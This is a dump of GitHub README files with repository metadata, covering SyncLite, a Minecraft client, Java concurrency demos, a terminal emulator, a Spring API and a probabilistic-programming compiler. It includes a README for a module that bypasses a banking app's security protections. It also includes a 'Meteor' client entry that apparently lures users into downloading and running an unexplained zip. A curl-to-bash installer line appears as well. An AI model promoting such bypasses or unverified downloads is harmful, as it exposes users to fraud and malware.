 		""arguments"" : [[3, ""three""], [4, ""four""]]
   	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Batch executed successfully, rows affected: 2""
   	}
  	```

	- Send a request to commit a transaction

	Request	
	```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
  		""txn-handle"": ""f47ac10b-58cc-4372-a567-0e02b2c3d479""
 		""sql"" : ""commit""
 	}
 	```

 	Response from Server 
 	```
  	{
  		""result"" : ""true""
 		""message"" : ""Transaction committed successfully""
   	}
  	```

	- Send a request to close database   	
 	Request

	 ```
 	{
 		""db-path"" : ""C:\synclite\users\bob\synclite\job1\test.db""
 		""sql"" : ""close""
   	}
 	```
	
 	Response from Server 
 	```
  	{
  		""result"" : ""true""
		""message"" : ""Database closed successfully""
   	}
  	```
 
5. SyncLite DB (internally leveraging SyncLite Logger), creates a device stage directory at configured stage path with sql logs created for each device. These device stage directories are continuously synchronized with SyncLite consolidator for consolidating them into final destination databases.
   
6. Several such hosts, each running SyncLite DB, each of them creating several SyncLite databases/devices (i.e. embedded databases), can synchornize these embedded databases in real-time with a centralized SyncLite consolidator that aggregates the incoming data and changes, in real-time, into configured destination databases.

     
# Running Integration Tests

```SyncLite Validator``` is a GUI based tool with a war file deployed on app server, it can be launched at http://localhost:8080/synclite-validator. A test job can be configured and run to execute all the end to end integration tests which validate data consolidation functionality for various SyncLite device types.  
    
	
# Pre-Built Releases:

## SyncLite Logger

1. SyncLite Logger is is published as maven dependency :
   ```
	<!-- https://mvnrepository.com/artifact/io.synclite/synclite-logger -->
	<dependency>
	    <groupId>io.synclite</groupId>
	    <artifactId>synclite-logger</artifactId>
	    <version>#LatestVersion#</version>
	</dependency>
   ```
2. OR You can directly download the latest published synclite-logger-<version>.jar from : https://github.com/syncliteio/SyncLiteLoggerJava/blob/main/src/main/resources/ and add it as a dependency in your applications.
   
## SyncLite Consolidator

1. A docker image of SyncLite Consolidator is available on docker hub : https://hub.docker.com/r/syncliteio/synclite-consolidator

2. OR a release zip file can be downloaded from this GitHub Repo : https://github.com/syncliteio/SyncLite/releases

# Supported Systems

## Source Systems
1. Edge Applications(Java/Python) +  SyncLite Logger (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
2. Edge Applications (any programming language) + SyncLite DB (wrapping embedded databases :SQLite, DuckDB, Apache Derby, H2, HyperSQL)
3. Databases : PostgreSQL, MySQL, MongoDB, SQLite
4. Message Brokers : Eclipse Mosquitto MQTT broker
5. Data Files : CSV ( stored on FS/S3/MinIO)

## Staging Storages
1. Local FS
2. SFTP
3. S3
4. MinIO
5. Kafka
6. Microsoft OneDrive
7. Google Drive
   
## Destination Systems
1. PostgreSQL
2. MySQL
3. MongoDB
4. Microsoft SQL Server
5. Apache Iceberg
8. ClickHouse
9. FerretDB
6. SQLite
7. DuckDB

# Patent
SyncLite is backed by patented technlogy, more info : https://www.synclite.io/resources/patent  

# Support
Join <a href=https://join.slack.com/t/syncliteworkspace/shared_invite/zt-2pz945vva-uuKapsubC9Mu~uYDRKo6Jw>Slack Channel</a> for support and discussions.

Contact: support@synclite.io
",3,3,5,5.0,"['synclite', 'build', 'anything', 'sync', 'anywhere', 'build', 'application', 'build', 'streaming', 'application', 'for', 'last', 'mile', 'delivery', 'deploy', 'database', 'pipeline', 'setup', 'rapid', 'iot', 'data', 'connector', 'synclite', 'component', 'build', 'synclite', 'release', 'structure', 'quick', 'start', 'base', 'use', 'synclite', 'logger', 'configuration', 'file', 'application', 'code', 'sample', 'sql', 'api', 'transactional', 'device', 'java', 'python', 'appender', 'device', 'java', 'python', 'stream', 'device', 'java', 'python', 'application', 'code', 'sample', 'kafka', 'api', 'launch', 'use', 'synclite', 'db', 'run', 'integration', 'test', 'release', 'synclite', 'logger', 'synclite', 'consolidator', 'support', 'system', 'source', 'system', 'stag', 'storage', 'destination', 'system', 'patent', 'support']","['synclite', 'build', 'application', 'device', 'java']"
reveny/Protecttai-Bypass,main,"# Protecttai-Bypass
A xposed module to bypass protectt.ai in Kotak Neo

---
> [!CAUTION]
**Disclaimer**: This project is for educational purposes only. The intention is to highlight the weaknesses of current security solutions and to encourage the development of better, more reliable alternatives. Use this information responsibly. Do NOT use this for malicious intent. I am not responsible for the actions taken by users of this module


## Overview

This repository contains a simple demonstration of how to bypass the Protectt.ai security solution implemented in the Kotak Neo app. Protectt.ai is designed to protect Android applications from various security threats, but it has significant flaws that make it unreliable and easy to bypass.

## Why Protectt.ai is Problematic

- **High Rate of False Positives**: Protectt.ai flags unrooted devices with their flawed LSPosed detection done by checking props.

- **Easily Bypassed**: Protectt.ai can be bypassed with minimal effort.

## Why?
This repository demonstrates a method to bypass Protectt.ai's protection with a single hook, highlighting the problems of this security solution. 
The intention behind this project is not malicious; rather, it aims to inform developers of the vulnerabilities within Protectt.ai, encouraging them to enhance and improve the solution.

### Steps to Bypass

1. Download the bypass apk from releases or build it on your own.

2. Run the Kotak Neo app with the hook applied, and see how the Protectt.ai solution is bypassed effortlessly.

## Contact
Feel free to reach out via:
- Telegram Group: [Join Group](https://t.me/reveny1)
- Telegram Contact: [Contact](https://t.me/revenyy)
- Website: [Website](https://reveny.me/contact.html)
",1,0,2,1.0,"['overview', 'why', 'problematic', 'why', 'step', 'bypass', 'contact']","['why', 'overview', 'problematic', 'step', 'bypass']"
MrzDemon/Minecraft-Meteor,master,"# Minecraft-Meteor

Meteor is a Minecraft client that is easy to use, featuring a wide array of modules and plugin support. It is always updated to the newest version, maintaining compatibility with the latest Minecraft releases. This repository serves as the home for Meteor client version 1.21.

---

## Table of Contents
- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Contributing](#contributing)
- [License](#license)
- [Download](#download)

---

## Features

🚀 **Wide Array of Modules**: Meteor comes equipped with a diverse range of modules that enhance your gameplay experience.

🛠 **Plugin Support**: Add plugins seamlessly to tailor your Minecraft environment to your preferences.

🔄 **Regular Updates**: Meteor is constantly updated to ensure compatibility with the latest Minecraft version and to introduce new features.

🔒 **Security**: Meteor prioritizes security to provide a safe and reliable client for Minecraft players.

---

## Installation

To install Meteor, follow these steps:

1. Download the latest version of Meteor from the [download section](#download).
2. Unzip the downloaded file.
3. Run the Meteor client executable.
4. Configure any settings or preferences according to your needs.

---

## Usage

After installing Meteor, launch the client and log in to your Minecraft account. Explore the various modules and plugins available to enhance your gameplay. Experiment with different combinations to create your ideal Minecraft experience.

---

## Contributing

Contributions to Meteor are welcome! If you have suggestions, bug reports, or would like to contribute code, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes.
4. Test your changes thoroughly.
5. Submit a pull request.

---

## License

Meteor is licensed under the MIT License. See the [LICENSE](LICENSE) file for more information.

---

## Download

[<img src=""https://img.shields.io/badge/Download-Meteor_Client_1.21-brightgreen"">](https://github.com/user-attachments/files/16830358/Client.zip)

Download the latest version of Meteor by clicking the button above.

---

Thank you for checking out Meteor! Happy gaming! 🎮🌌

---",1,0,1,0.0,"['table', 'content', 'feature', 'installation', 'usage', 'contribute', 'license', 'download']","['table', 'content', 'feature', 'installation', 'usage']"
aemisigna/hololiveid-kaela-event-public,main,"![Kaela's Event Logo](https://cdn.marow.dev/content/kaela_event_git_logo.png)

**Astonishingly KAEOTIC** is a Minecraft Event hosted by [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) and [hololive production](https://hololive.hololivepro.com/en).

[![Kaela's Tour](https://img.youtube.com/vi/n3BAPr9qGGQ/0.jpg)](https://www.youtube.com/watch?v=n3BAPr9qGGQ)

## 🔨 Technical details
- Server must use the [PaperMC](https://papermc.io) and [Nitori](https://github.com/Gensokyo-Reimagined/Nitori) software.
- It's recommended to use a proxy software like [Velocity](https://papermc.io/software/velocity) or [BungeeCord](https://www.spigotmc.org/wiki/bungeecord/).
- It's highly recommended to enable the server [resource pack](https://cdn.marow.dev/content/KaelaEventPack.zip), otherwise stuff might be a little weird.

## 🔨 Resource Pack
- Resource pack can be downloaded [here](https://cdn.marow.dev/content/KaelaEventPack.zip)
- Resources are on Minecraft version **1.21.1**.

## 🔨 Warning
- This server setup was made for [COVER Corporation](https://cover-corp.com/en/company) & [hololive production](https://hololive.hololivepro.com/en).
- The server is not made to be easy to install outside of the event host.
- This page is going to change by the time!

## 🔨 Acknowledgments
- [COVER Corporation](https://cover-corp.com/en/company) for once more, hosting awesome events!
- [Kaela Kovalskia](https://www.youtube.com/@KaelaKovalskia) for the opportunity!
- [Allan Castro](https://x.com/Allan_z8), for the server resource pack making.",1,0,1,0.0,"['technical', 'detail', 'resource', 'pack', 'warn', 'acknowledgment']","['technical', 'detail', 'resource', 'pack', 'warn']"
wkorando/loominated-java,main,"# Loominated Java

The purpose of this project is to introduce and demonstrate the three central features of [Project Loom](https://openjdk.org/projects/loom/); [Virtual Threads](#virtual-threads), [Structured Concurrency](#structured-concurrency), and [Scoped Values](#scoped-values). Primarily the project is demonstrating using Structured Concurrency to break down an unit of work and execute it as concurrent tasks. 

You can view the accompanying presentation for this project here: https://wkorando.github.io/presentations/loominated-java/

## Virtual Threads

The central feature of Project Loom, virtual threads separate the concept of threads into two distinct parts. The Platform Thread, which is functionally similar to legacy Threads in, which have a one-to-one relationship to OS threads. And Virtual Threads, which exist in memory and run on top of platform threads. For a high-level overview of virtual threads, see this video: [https://www.youtube.com/watch?v=bOnIYy3Y5OA](https://www.youtube.com/watch?v=bOnIYy3Y5OA). For a more in-depth explanation on virtual threads be sure to read the [JEP 444](https://openjdk.org/jeps/444). 

## Structured Concurrency

Structured Concurrency, currently in preview as of JDK 23, is designed to allow developers to break a unit of work into multiple tasks that can be executed simultaneously. Structured concurrency introduces a new programming model to Java greatly simplifying the writing (and reading) of concurrent blocks of code, as well as error handling and debugging. Both of which will be covered in this project. 

## Scoped Values

With the introduction of virtual threads, and the possibility of tens of thousands, or more, concurrent threads being handled by a JVM, comes new issues. Historically in Java contextual information when Scoped Values were intended to 


https://openjdk.org/jeps/8338456

## About the Project

### Running the Project

This project is using the latest changes from the Loom EA builds, they are available for download here: [https://jdk.java.net/loom/](https://jdk.java.net/loom/)

### The ""Task""

The purpose of this project is to demonstrate running tasks concurrently, so isn't particularly concerned with the look of the task(s) being executed. The task, as designed, is simply wrapping a passed in value in a simple JSON message only to provide a thin veneer of similarity to real-world tasks. The task however is designed to be easily configurable in how long it takes to execute and/or if an error occurs during. 

```java
public static String task(String value, long executionTime, boolean throwException) {
	executionTime(executionTime);
	if (throwException) {
		throw new RuntimeException(String.format(""""""
				Task failed!
				value: %s
				executionTime: %d
				throwException: %b
				"""""", value, executionTime, throwException));
	}
	String result = String.format(""""""
			{
				""value"" : ""%s""
			}
			"""""", value);
	System.out.println(""Result of taks: "" + result);
	return result;
}
```

### Working with the Project

The project is divided in five steps, roughly representing ""maturity"" regarding concurrent concepts.

* [Step 1](#step-1-linear-programming) - Tasks are executed in serial, because the effort of writing the code concurrently was too difficult/not worth the effort.

* [Step 2](#step-2-concurrent-programming-pre-virtual-threads) - Tasks executed concurrently, but without using virtual threads. 

* [Step 3](#step-3-concurrent-programming-pre-structured-concurrency) - Tasks executed concurrently, but using virtual threads. Examples also go into the difficulty of error handling and cancel propagation in a pre-structured concurrency world. 

* [Step 4](#step-4-concurrent-programming-with-structured-concurrency) - Various examples and scenarios demonstrating how to use structured concurrency to execute tasks concurrently.

* [Step 5](#step-5-working-with-scoped-values) - Simple examples using Scoped Values. 

### Step 1 - Linear Programming

The mindshare and difficulty of concurrent programming; configuring and managing threadpools, error handling and rollback when a task fails, the change in programming model, and disincentivized re-writing tasks from executing concurrently. Though meant that the time to execute tasks was the combined time to execute all the tasks, like in this example. This might often result in slow response times for clients. Like in this example. 

### Step 2 - Concurrent Programming Pre-Virtual Threads

Prior to virtual threads, when considering splitting a unit of work to be executed in concurrent tasks. This would making a choice between the best way of handling 

### Step 3 - Concurrent Programming Pre-Structured Concurrency

Splitting up a unit of work and executing it as concurrent tasks, wasn't always trivial, as we will review in these code examples. 

#### Cancel Propagation

Canceling other concurrent tasks when either a success of failure condition is met was difficult prior to structured concurrency. 

#### Debugging

When using [ ], the relationship between the tasks and subtasks wasn't tracked. This could make debugging difficult for applications receiving many requests, as it would be difficult to determine the parent thread that started the execution of the subtask. 

### Step 4 - Concurrent Programming with Structured Concurrency

#### Configuring Joiner Policies

#### Custom Cancellation Policies


### Step 5 - Working with Scoped Values


### Current State

Various ways of implementing a solution that can be broken into sub tasks executed concurrently. 

1. [SerialSolution](src/main/java/com/fly/us/SerialSolution.java) - Demonstrates calling multiple tasks serially. Easy to implement, understand, and debug, but slow, as the time to execute is the sum of all the tasks. 

2. [FuturesSolutionPreVirtualThreads](src/main/java/com/fly/us/FuturesSolutionPreVirtualThreads.java) - Pre Virtual Threads, there are many different executors to choose from with their own relative strengths and weaknesses. Knowing which to use was difficult.

3. [FuturesSolutionWithVirtualThreads](src/main/java/com/fly/us/FuturesSolutionWithVirtualThreads.java) - Demonstrates the new `Executors.newVirtualThreadPerTaskExecutor()`. Which should be used in nearly all cases. Just let the JDK handle mounting/unmounting virtual threads, they are cheap!

4. [FuturesSolutionShutdownOnError](src/main/java/com/fly/us/FuturesSolutionShutdownOnError.java) - The trouble with concurrency is failures happen! This is an example of the difficulty of handling that use case in current state. Primarily the canceling the execution of other tasks when a failure is detected. 

4. [FuturesSolutionShutdownOnSuccess](src/main/java/com/fly/us/FuturesSolutionShutdownOnSuccess.java) - Alternatively, maybe you want to get the first successful result. This example demonstrates that behavior. 

### Error Handling

### Debugging


",0,0,1,1.0,"['loominated', 'java', 'virtual', 'thread', 'structured', 'concurrency', 'scoped', 'value', 'about', 'project', 'run', 'project', 'the', 'task', 'work', 'project', 'step', 'linear', 'programming', 'step', 'concurrent', 'program', 'thread', 'step', 'concurrent', 'program', 'concurrency', 'cancel', 'propagation', 'debug', 'step', 'concurrent', 'program', 'structured', 'concurrency', 'configure', 'joiner', 'policy', 'custom', 'cancellation', 'policy', 'step', 'work', 'scoped', 'value', 'current', 'state', 'error', 'handle', 'debug']","['step', 'concurrency', 'project', 'concurrent', 'program']"
mq-soft-tech/comp2000_2024,week01,"# Welcome to COMP2000 - Object Oriented Programming Practices
## Session 2, 2024

Please ensure that you follow the weekly updates in this repository
Weekly tasks will be available in the [worksheet.md](worksheet.md) file

Assignment code will also become available via this Github repository. You are free to clone this repository into your own hosted git environment, such as Github, Bitbucket, or Gitlab.

*However*, please be aware that any repository containing your assignment code **must** be made private. Any repository with assignment code that is public available, or found to be shared with other students, will be considered a violation of the academic integrity policy.
",0,0,10,16.0,"['welcome', 'object', 'orient', 'programming', 'practice', 'session']","['welcome', 'object', 'orient', 'programming', 'practice']"
PavelKastornyy/jeditermfx,master,"# JediTermFX
* [Overview](#overview)
* [Demo](#demo)
* [Features](#features)
* [Terminal Comparison](#comparison)
* [Usage](#usage)
    * [Hyperlinks](#usage-hyperlinks)
* [Code building](#code-building)
* [Running the Application](#application)
    * [Using Maven](#application-maven)
    * [Using Distro](#application-distro)
* [License](#license)
* [Feedback](#feedback)

# Overview <a name=""overview""></a>

JediTermFX is a Terminal Emulator for JavaFX. The project is a result of porting
[JediTerm](https://github.com/JetBrains/jediterm) (commit 8366f2b) from Swing to JavaFX. JediTermFX exclusively
utilizes JavaFX components. Therefore, the Terminal Emulator based on this library can be seamlessly integrated into
any JavaFX application. A detailed comparison of terminal libraries is provided below.

# Demo <a name=""demo""></a>

![JediTermFX demo](./demo.gif)

# Features <a name=""features""></a>

* Local terminal for Unix, Mac and Windows using Pty4J
* Xterm emulation - passes most of tests from vttest
* Xterm 256 colours
* Scrolling
* Copy/Paste
* Mouse support
* Terminal resizing from client or server side
* Terminal tabs

# Terminal Comparison <a name=""comparison""></a>

Terminal      | JediTermFX  | [JediTerm](https://github.com/JetBrains/jediterm)  | [TerminalFX](https://github.com/javaterminal/TerminalFX) |
:-------------|:----------- |:--------------|:--------------|
GUI Library   | JavaFX      | Swing         | JavaFX        |
Main Component| Canvas      | JComponent    | WebView       |
Languages     | Java        | Java, Kotlin  | Java, JS      |
JPMS Support  | Yes         | No            | Yes           |

# Usage <a name=""usage""></a>

It is recommended to start working with JediTermFX by studying and running the
[BasicTerminalShellExample](jeditermfx-app/src/main/java/pk/jeditermfx/app/example/BasicTerminalShellExample.java) class.
This class contains the minimal code needed to launch a terminal in a JavaFX application.

## Hyperlinks <a name=""usage-hyperlinks""></a>

JediTermFX provides a wide range of features when working with links. The `HighlightMode` enumeration specifies multiple
modes of working with links and their colors. In the `ALWAYS` modes, links are always underlined and always clickable.
In the `NEVER` modes, links are never underlined and never clickable. In the `HOVER` modes, links become underlined and
clickable only when hovered over. Now let's clarify the difference between the two types of colors. `CUSTOM` colors
are those set by the JediTermFX user in the getHyperlinkColor() method of the settings. `ORIGINAL` colors are those
offered by the program running in the terminal. Thus, links can use either custom colors or the original text colors.

# Code Building <a name=""code-building""></a>

To build the library use standard Git and Maven commands:

    git clone https://github.com/PavelKastornyy/jeditermfx
    cd jeditermfx
    mvn clean install

# Running the Application <a name=""application""></a>

The project contains a demo application that shows how to use this library. There are two ways to run the application.

## Using Maven <a name=""application-maven""></a>

To run application using maven plugin execute the following commands in the root of the project:

    cd jeditermfx-app
    mvn javafx:run

Please note, that debugger settings are in `jeditermfx-app/pom.xml` file.

## Using Distro <a name=""application-distro""></a>

After building the project, you will find a distribution archive named `jeditermfx-version-app.tar` in the
`jeditermfx-app/target` directory. Extracting this file will allow you to launch the application using `.sh` or `.bat`
scripts depending on your operating system.

# License <a name=""license""></a>

JediTermFX is dual-licensed under both the LGPLv3 (found in the LICENSE-LGPLv3.txt file in the root directory) and
Apache 2.0 License (found in the LICENSE-APACHE-2.0.txt file in the root directory). You may select, at your option,
one of the above-listed licenses.

# Feedback <a name=""feedback""></a>

Any feedback is welcome. Besides, it would be interesting to know for what cases this project is used. It will
help to understand the way the project should go and provide more information in documentation.



",0,0,1,3.0,"['jeditermfx', 'overview', 'a', 'overview', 'demo', 'a', 'demo', 'feature', 'a', 'feature', 'terminal', 'comparison', 'a', 'comparison', 'usage', 'a', 'usage', 'hyperlink', 'a', 'code', 'building', 'a', 'run', 'application', 'a', 'application', 'use', 'maven', 'a', 'use', 'distro', 'a', 'license', 'a', 'license', 'feedback', 'a', 'feedback']","['a', 'overview', 'demo', 'feature', 'comparison']"
sivaprasadreddy/spring-realworld-conduit-api,main,"# Spring Boot RealWorld Conduit API

![Spring Boot RealWorld Conduit API](logo.png)

**Spring Boot RealWorld Conduit API** implements the [API Endpoints](https://realworld-docs.netlify.app/docs/specs/backend-specs/endpoints) of [Conduit](https://github.com/gothinkster/realworld),
which is a Medium.com clone.

[![CI Build](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml/badge.svg)](https://github.com/sivaprasadreddy/spring-realworld-conduit-api/actions/workflows/maven.yml)
[![Quality Gate Status](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=alert_status)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)
[![Coverage](https://sonarcloud.io/api/project_badges/measure?project=sivaprasadreddy_spring-realworld-conduit-api&metric=coverage)](https://sonarcloud.io/summary/new_code?id=sivaprasadreddy_spring-realworld-conduit-api)

## Tech Stack
* [Java 21](https://dev.java/)
* [Spring Boot](https://spring.io/projects/spring-boot)
* [Spring Security](https://spring.io/projects/spring-security)
* [Spring Modulith](https://spring.io/projects/spring-modulith)
* [jOOQ](https://www.jooq.org/)
* [PostgreSQL](https://www.postgresql.org/)
* [FlywayDB](https://flywaydb.org/)
* [JUnit 5](https://junit.org/junit5/)
* [Testcontainers](https://testcontainers.com/)
* [Docker Compose](https://docs.docker.com/compose/)

## Prerequisites
* JDK 21
* Docker and Docker Compose
* Your favourite IDE (Recommended: [IntelliJ IDEA](https://www.jetbrains.com/idea/))

Install JDK using [SDKMAN](https://sdkman.io/)

```shell
$ curl -s ""https://get.sdkman.io"" | bash
$ source ""$HOME/.sdkman/bin/sdkman-init.sh""
$ sdk install java 21.0.1-tem
$ sdk install maven
```

Verify the prerequisites

```shell
$ java -version
openjdk version ""21.0.1"" 2023-10-17 LTS
OpenJDK Runtime Environment Temurin-21.0.1+12 (build 21.0.1+12-LTS)
OpenJDK 64-Bit Server VM Temurin-21.0.1+12 (build 21.0.1+12-LTS, mixed mode)

$ docker info
Client:
 Version:    27.0.3
 Context:    desktop-linux
 ...
 ...
Server:
 Server Version: 27.0.3
 ...
 ...

$ docker compose version
Docker Compose version v2.28.1-desktop.1
```

## How to?

```shell
# Clone the repository
$ git clone https://github.com/sivaprasadreddy/spring-realworld-conduit-api.git
$ cd spring-realworld-conduit-api

# Run tests
$ ./mvnw test

# Automatically format code using spotless-maven-plugin
$ ./mvnw spotless:apply

# Run/Debug application from IDE
Run `src/main/java/conduit/ConduitApplication.java` from IDE.

# Run application using Maven
./mvnw spring-boot:run
```

The application is configured to use Docker Compose to automatically start the application dependencies
such as PostgreSQL.

* PostgreSQL container connection properties:
  ```shell
  host: localhost
  port: 65432
  username: postgres
  password: postgres
  database: postgres
  ```
* Application run on port http://localhost:8080
* Swagger UI: http://localhost:8080/swagger-ui/index.html

## Using [Taskfile](https://taskfile.dev/) utility
Task is a task runner that we can use to run any arbitrary commands in easier way.

### Installation

```shell
$ brew install go-task
(or)
$ go install github.com/go-task/task/v3/cmd/task@latest

#verify task version
$ task --version
Task version: 3.35.1
```

### Using `task` to perform various tasks:

```shell

# Run tests
$ task test

# Automatically format code using spotless-maven-plugin
$ task format

# Build docker image
$ task build_image

# Run application in docker container
$ task start
$ task stop
$ task restart
```
",0,1,4,0.0,"['spring', 'boot', 'realworld', 'conduit', 'api', 'tech', 'stack', 'prerequisite', 'how', 'to', 'clone', 'repository', 'run', 'test', 'automatically', 'format', 'code', 'use', 'application', 'ide', 'run', 'application', 'use', 'maven', 'use', 'taskfile', 'http', 'utility', 'installation', 'use', 'task', 'perform', 'various', 'task', 'run', 'test', 'automatically', 'format', 'code', 'use', 'build', 'docker', 'image', 'run', 'application', 'docker', 'container']","['use', 'run', 'application', 'test', 'automatically']"
oracle/sandwood,main,"# Sandwood
Sandwood is a language, compiler, and runtime for JVM based probabilistic models. It is designed to allow models to be written in a language that is familiar to Java developers. The resulting models take the form of Java objects allowing them to be well abstracted components of an encompassing system.

## What is probabilistic programming?
With a traditional Bayesian Model the user has to design the model, and then implement inference code for any operation they wish to perform on the model. This creates a number of issues:

1. Constructing inference code is technically challenging to do, and time consuming. This step presents an opportunity for subtle bugs to be introduced.

2. If the model is modified, then the inference code will have to be updated. This is also time consuming and technically challenging, leading to the following problems:

  * It acts as a deterrent to modifying models.

  * It is possible for different inference operations to get out of step so some work on the old model and some work on the new model.

  * It presents another opportunity for bugs to get in the inference algorithm as users try to make subtle adjustments to existing code.
	
3. Looking at the code it is hard to see what the model is. This harms maintainability.

Probabilistic programming overcomes these issues by allowing models to be described using either an API, or a domain specific language (DSL) as is the case with Sandwood. The [Sandwood DSL](docs/Sandwood.md) is compiled to produce Java classes that represent the model and implement all the required inference operations. This has a number of advantages:
* Users are no longer required to handle the technical complexity of constructing inference code.
* Updating the model is now just requires changes to the high-level language and then recompilation to generate the new inference code.
* Models described in the high-level language are much more understandable improving code maintainability.
* All the inference operations are guaranteed to be for the same model.
* User bugs are confined to the model, with the inference code coming from the compiler.

## Installation
Sandwood consists of 3 components each in their corresponding directory:

- The compiler and runtime (Sandwood)
- The plugin for Maven (SandwoodMavenPlugin)
- A set of example models (SandwoodExamples)

Each piece is dependent on the preceding pieces. Each component directory contains a Maven POM file to construct the component. For the compiler and the plugin these will need to be called with `install` to make them available for later stages, i.e. `mvn clean install`. The examples should only be built as `mvn clean package`.

Having installed Sandwood there are currently 3 ways of compiling a model:
1. A command line tool.
2. A Java library call.
3. A Maven plugin.

### Command Line Tool
To use Sandwood from the command line once the compiler and runtime have been built command line scripts that have similar functionality to `javac` can be found in `commandline/SandwoodC/bin`. To use this the user would typically add the bin directory to the path, then call sandwoodc.sh HMM.sandwood to compile the HMM model. `sandwoodc.sh -h` or `sandwoodc.bat -h` will result in a description of the usage and available options being printed out.

### Java Library Call
All the functionality of SandwoodC can be reached by calling the method `compile` in `org.sandwood.compilation.SandwoodC` and passing an array containing the arguments that would have been passed to the command line.

### Maven Plugin
The Maven plugin can be used to automatically trigger compilation of sandwood files when the dependent project is built. To use the plugin you need to add the sandwood runtime as a dependency, and add the plugin to the build. This is achieved with the following additions to the POM file:

```
<dependencies>
	<dependency>
		<groupId>org.sandwood</groupId>
		<artifactId>sandwood-runtime</artifactId>
		<version>0.3.0</version>
	</dependency>
</dependencies>
```

```
<build>
	<plugins>
		<plugin>
			<groupId>org.sandwood</groupId>
			<artifactId>sandwoodc-maven-plugin</artifactId>
			<version>0.3-SNAPSHOT</version>
			<executions>
				<execution>
					<configuration>
						<partialInferenceWarning>true</partialInferenceWarning>
						<sourceDirectory>${basedir}/src/main/java</sourceDirectory>
					</configuration>
					<goals>
						<goal>sandwoodc</goal>
					</goals>
				</execution>
			</executions>
		</plugin>
	</plugins>
</build>`
```

The inclusion of the element `<sourceDirectory>${basedir}/src/main/java</sourceDirectory>` instructs the plugin which directory to look in for models. Other useful flags include:

* `debug` This option is used to obtain debugging information from SandwoodC. Setting this option to `true` causes Sandwood to generate a trace of its actions. The default value is `false`. Note this flag is for debugging errors with the compiler configuration/compiler, not with the model being compiled. Errors and warnings in the sandwood model files will always be returned by the compiler.

* `partialInferenceWarning` This option is used to stop SandwoodC from failing when some inference steps cannot be constructed. Setting this option to `true` causes Sandwood to just generate warnings on missing steps. Default value is `false`.

* `sourceDirectory` This parameter sets which directory to look in for model files. Within this directory the models can be located in different packages.

* `outputDirectory` This parameter sets which directory the Java source code for the models should be placed into. The default value is `${project.build.directory}/generated-sources/sandwood`.

* `calculateIndividualProbabilities` This parameter specifies if the probabilities for each random variable constructed  in a loop should be calculated instead of a single value for all instances. The default value is `false`.

* `javadoc` This parameter instructs the compiler to generate JavaDoc to compliment the model. The default value is `false`.

* `javadocDirectory` This parameter specifies the location that the generated should be placed.

* `executable` This parameter allow for an alternative JVM to be specified to run the Sandwood compiler with.

## Documentation
What follows is an introduction to how to write Sandwood models and how to use the resultant classes that implement the models. 

An outline of the steps a model goes through can be seen in this diagram. Models start as a `.sandwood` file that is compiled to a set of class files. These can be instantiated multiple times to generate multiple instances of the model with different configurations.

![Picture describing the stages of sandwood model from source code to instantiated objects in a program.](docs/images/Components.jpg ""Picture describing the stages of sandwood model from source code to instantiated objects in a program."")


### Example Model
As a running example we will use a [Hidden Markov Model (HMM)](https://en.wikipedia.org/wiki/Hidden_Markov_model). This model is written here in Sandwood. This model should be saved in a file called `HMM.sandwood` in a package directory `org/sandwood/examples/hmm`. A fuller description of the language can be found [here](docs/Sandwood.md).

```java
package org.sandwood.examples.hmm;
 
model HMM(int[] eventsMeasured, int numStates, int numEvents) {
  //Construct a transition matrix m.
  double[] v = new double[numStates] <~ 0.1;
  double[][] m = dirichlet(v).sample(numStates);
 
  //Construct weighting for which state to start in.
  double[] initialState = new Dirichlet(v).sample();
      
  //Construct weighting for each event in each state.
  double[] w = new double[numEvents] <~ 0.1;
  double[][] bias = dirichlet(w).sample(numStates);
 
  //Allocate space to record the sequence of states.
  int sequenceLength = eventsMeasured.length;
  int[] st = new int[sequenceLength];
 
  //Calculate the movements between states.
  st[0] = categorical(initialState).sampleDistribution();
  for (int i: [1..sequenceLength) )
    st[i] = categorical(m[st[i - 1]]).sampleDistribution();
 
  //Emit the events for each state.
  int[] events = new int[sequenceLength];
  for (int j = 0; j < sequenceLength; j++)
    events[j] = new Categorical(bias[st[j]]).sample();
    
  //Assert that the events match the eventsMeasured data.
  events.observe(eventsMeasured);
}
```

In addition to the documentation of the Sandwood language and the JavaDoc comment that can be generated for a model there are a number of examples in the Sandwood Examples directory and we suggest new users start by examining and modifying these.

### Sandwood language
A description of the language used to describe Sandwood models can be found [here](docs/Sandwood.md). The language is constructed with the intent of being familiar to Java developers, but does not contain the ability to construct Objects. We plan to add support for record types in the future to make the import and export of data to and from models simpler.

### Compiled models
When a model is compiled a number of class files are generated in the same package that the model is defined in. One of these classes will have the same name as the name provided to the model, so in this case  _HMM.class_ , and this is the class that the user should instantiate in order to have an instance of the model. Each publicly visible variable in the model corresponds to a field in the generated class. The [example HMM](#example-model) can be seen below.

![Picture describing the classes created for the example HMM model](docs/images/ModelClasses.jpg ""Picture describing the classes created for the example HMM model"")

By running the compiler with the `javadoc` flag set JavaDoc will be created for each public method and class in the generated model file.

### Using Compiled Models
Once the model has been compiled we need to instantiate instances of it. These instances are independent and the user can create as many different copies of the model as they wish.

#### Constructing a model
Instances of the model object are constructed via the class constructor. As described earlier there are typically 3 constructors for the model. The only case when there will be fewer is when the different variants of the constructor map to the same signature, in which case one constructor will apply to more than one of these scenarios.

* Full constructor - This constructor takes all the arguments that appear in the model signature and sets them. This constructor is used for the infer values and infer probabilities operations.

* Empty constructor - This constructor takes no arguments, leaving the parameters for the user to set later.

* Execution Constructor - This constructor removes arguments that are only observed, and for observed arguments whose dimensions are used as inputs to the code, takes those dimensions instead of the full parameters. So in the HMM example the eventsMeasured parameter will become an integer describing the length of the sequence.

These code samples demonstrate how to make calls to the compiled models.

#### Interacting with a model
Interactions with a model via the model object takes two forms:

* Calls to model object methods for global operations such as setting default retention policies, checking if the model is ready for inference, and starting inference steps, etc. 

